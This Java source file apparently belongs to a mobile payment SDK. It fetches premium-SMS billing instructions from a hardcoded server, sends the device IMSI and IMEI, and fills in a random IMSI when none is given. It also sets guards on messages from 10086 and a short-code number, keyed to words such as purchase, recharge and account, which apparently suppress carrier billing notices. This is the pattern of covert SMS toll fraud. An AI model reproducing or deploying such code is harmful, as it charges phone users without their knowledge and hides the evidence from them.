package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;

/**
 * 请求参数说明：				
imei：请尽量传递真实的imei号，14或15位数字				
imsi：请尽量传递真实的imsi号，15位数字,4600开头				
				
返回格式：				
text格式，不需要对特殊字符做任何转义处理，直接解析即可使用				
port1####sms1####port2####sms2				
返回参数说明：				
port1：登录短信发送端口号				
sms1 ：登录短信内容				
port2：计费短信发送端口号				
sms2 ：计费短信内容				
 * @author leoliu
 *
 */
public class XmwtDjDynamicService implements IDynamicService{

	private static final String TYPE = "xmwtDj";

	private static final String REQUESTMODEL = "imsi={imsi}&imei={imei}";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final Guard guard1 = new Guard("1065889955","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("1065889955","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	private int timeOut = 60;
	
	private Map<String, Long> tryMap = new HashMap<String, Long>();
	@Override
	public String getType() {
		return TYPE;
	}

	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = map.get("imsi");
			
			if(imsi == null || imsi.length() == 0){
				imsi = fillImei("46000");
			}
			
			String imei = map.get("imei");
			
			String requestParam = REQUESTMODEL.replace("{imsi}", imsi).replace("{imei}",imei);
			
			String responsetxt = GetData.getData(url,requestParam);
			
			xml = parseXml(responsetxt);
			
			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	/**
	 * port1####sms1####port2####sms2
	 * @param responsetxt
	 * @return
	 */
	private String parseXml(String responsetxt){
		
		if(responsetxt != null && responsetxt.length() > 0){
			try{
				String[] arr = responsetxt.split("####");
				
				if(arr.length == 4){
					Sms sms1 = new Sms();
					
					sms1.setSmsContent(arr[1]);
					sms1.setSmsDest(arr[0]);
					sms1.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					Sms sms2 = new Sms();
					
					sms2.setSmsContent(arr[3]);
					sms2.setSmsDest(arr[2]);
					sms2.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					Sms guardSms = new Sms();
					
					List<Guard> guardList = new ArrayList<Guard>();
					
					guardList.add(guard1);
					guardList.add(guard2);
					
					guardList.add(guard3);
					guardList.add(guard4);
					
					guardSms.setGuardList(guardList);
					
					StringBuffer sb = new StringBuffer();
					
					sb.append(XstreamHelper.toXml(sms1));
					
					sb.append("<wait>2</wait>");
					
					sb.append(XstreamHelper.toXml(sms2));
					
					sb.append(XstreamHelper.toXml(guardSms));
					
					return sb.toString();
				}
					
			}catch(Exception e){
				e.printStackTrace();
			}
		}
		
		return null;
	}
	
	private String fillImei(String imei){
		if(imei.length() < 15){
			int len = imei.length();
			
			for(int i = 0 ; i < 15 - len ; i ++){
				imei += new Random().nextInt(10);
			}
		}
		
		return imei;
	}

	public static void main(String[] args){
		
		String url = "http://114.215.101.100:8080/s/cmgame/getSms/8a2321e64c5a4ebc014c5a7708200041/";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("channel", "10B9KTa100546110");
		map.put("imsi","460029647996597");
		map.put("imei","860955029674037");
		map.put("type","xmwtDj");
		
		System.out.println(new XmwtDjDynamicService().dynamic(map));
		
		
		
	}
}
